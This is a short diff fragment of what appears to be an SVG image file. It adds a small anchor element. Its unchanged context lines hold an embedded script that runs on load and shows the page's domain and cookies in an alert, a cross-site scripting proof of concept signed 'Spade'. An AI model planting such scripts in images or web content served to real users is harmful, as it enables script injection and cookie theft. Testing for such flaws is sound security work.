@@ -8,3 +8,5 @@
       alert('XSS by Spade\n'+document.domain+'\n'+document.cookie);
    </script>
 </svg>
+
+<a>mm</a>
